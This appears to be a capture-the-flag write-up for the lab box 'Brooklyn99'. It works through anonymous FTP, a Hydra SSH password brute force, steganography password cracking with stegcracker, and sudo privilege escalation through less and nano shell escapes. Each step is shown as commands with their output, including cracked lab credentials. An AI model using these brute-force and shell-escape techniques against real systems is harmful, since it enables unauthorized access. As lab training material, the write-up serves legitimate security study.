# Brooklyn99 CTF
export ip=10.10.15.26
## Enumeration
Going to the site and checking the html we can see this 
```html 
<!-- Have you ever heard of steganography? -->
```
**Intersting**   
There is 2 intended way of rooting the box. 
------------
# Method one
### Nmap scan 
```bash
└─# nmap 10.10.15.26 -T5   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 07:33 EST
Nmap scan report for 10.10.15.26
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
````
### FTP 
I didnt check if FTP has **Anonymous** login enabled but tried it and we can login as anonymous. 

navigating  through we found this file
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
```
We can download the text file to your machine through get. (you can also use mget command)
The note we found is as follow
>From Amy,

>Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

This might come in handy knowing jake ```"Detective Jake Peralta(holts voice)"``` uses weak password :).

**``Username : jake``**
lets try to brute force the accound jake with rock you

### Hydra
```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt  10.10.15.26  ssh -t 4
```  
we used **jake** as the user and used argument **-P** to specify our world list with out IP and port we are attacking which is **ssh** 
``` bash
host: 10.10.15.26   login: jake   password: 987654321
```  
Oh dear jake u failed us hope this wont let me in .  
```ssh jake@'ur_ip_here'```  
And we are in. **Oh Jake Peralta Amy would be disappointed**

## Privilege Escalation
```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ 
```
intersting jake can run /usr/bin/less as sudo. Lets go to [gtfobins.github.io](gtfobins) to check how we can privilege escalate our way.   
By searching less we found a way to escalte. We can run less binary as a superuser. we can spawn a shell with higher privilage 
```sudo less /etc/profile ```
```!/bin/sh```


```bash
jake@brookly_nine_nine:~$ sudo less /etc/profile
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
```
>-- Creator : Fsociety2006 --
>Congratulations in rooting Brooklyn Nine Nine
>Here is the flag: 63a9f0ea*********96b649e85481845
>
>Enjoy!!

### Forgot the user flag but here it is 
----------------
# Method 2
## Steganography
[https://0xrick.github.io/lists/stego](0xrick) Has good resources on Steganography tools to use.  
Lets explore some  
```bash
└─# exiftool brooklyn99.jpg 
ExifTool Version Number         : 
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 68 KiB
File Modification Date/Time     : 2020:05:26 05:01:39-04:00
File Access Date/Time           : 2022:02:26 05:38:36-05:00
File Inode Change Date/Time     : 2022:02:26 05:35:43-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
````
THis is the exiftool you can run more enumration using other toolds like **file** and **string**  
Running string returned lot of strings inside. Maybe we can check those. But an intersting thing to notice is when we tried to check if there is anyting inside the image using **steghide** it asks for a password. So lets run **stegcracker** to crack the password with common passwords.  


```bash
└─# stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt 

Tried 20203 passwords
Your file has been written to: brooklyn99.jpg.out
**** //<= password

```` 
lets now go and extract the file inside the image.
```bash
└─# steghide extract -sf brooklyn99.jpg                        
Enter passphrase: 
wrote extracted data to "note.txt".
 ```
This is the note that is extracted
>Holts Password:
>**********@ninenine

>Enjoy!!

We got holts password. using hold as user name and the password we found we are in
```bash
└─# ssh holt@10.10.45.249
holt@brookly_nine_nine:~$ whoami
holt
```
## Privilege Escalation
Captain Ray Holt is can run **/bin/nano** binary as sudo . **Intersting**   
Going to gtfobin we found this
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
lets run it 


```bash
holt@brookly_nine_nine:~$ sudo nano

````
this will take us to nano Clicking control R and control x will enable us to execute system commands ruuning 
```reset; sh 1>&0 2>&0``` will give us shell as root

### Proof of concept 
```bash

Command to execute: reset; sh 1>&0 2>&0#                                                                            
# whoami
root
# 
````

We have found both ways to root the box. 
--------